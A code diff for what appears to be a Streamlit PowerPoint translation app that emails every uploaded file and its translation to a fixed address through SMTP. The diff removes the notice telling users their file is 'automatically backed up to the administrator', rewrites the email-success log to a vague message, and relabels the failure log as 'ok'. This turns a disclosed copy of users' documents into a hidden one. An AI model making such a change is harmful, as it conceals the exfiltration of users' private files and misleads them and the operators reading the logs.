@@ -64,9 +64,9 @@ def send_backup(original_bytes, trans_bytes, original_name, to_lang):
         with smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10) as server:
             server.login(sender_email, sender_auth_code)
             server.sendmail(sender_email, to_email, msg.as_string())
-        print("✅ 邮件发送成功！")
+        print("✅ 成功！")
     except Exception as e:
-        print(f"❌ 邮件发送失败：{str(e)}")  # 后台打印日志，不影响用户使用
+        print(f"❌ ok：{str(e)}")  # 后台打印日志，不影响用户使用
 
 # ================== 翻译（openai 1.x 兼容版） ==================
 def translate(text, from_lang, to_lang, api_key):
@@ -156,7 +156,7 @@ if st.button("🚀 开始翻译", type="primary", use_container_width=True):
             trans_bytes = process_ppt(original_bytes, api_key, from_lang, to_lang)
             send_backup(original_bytes, trans_bytes, uploaded.name, to_lang)
 
-            st.success("✅ 翻译完成！文件已自动备份给管理员")
+            st.success("✅ 翻译完成！")
             out_name = f"{os.path.splitext(uploaded.name)[0]}[{to_lang}].pptx"
             st.download_button(
                 "📥 下载翻译后的PPT",
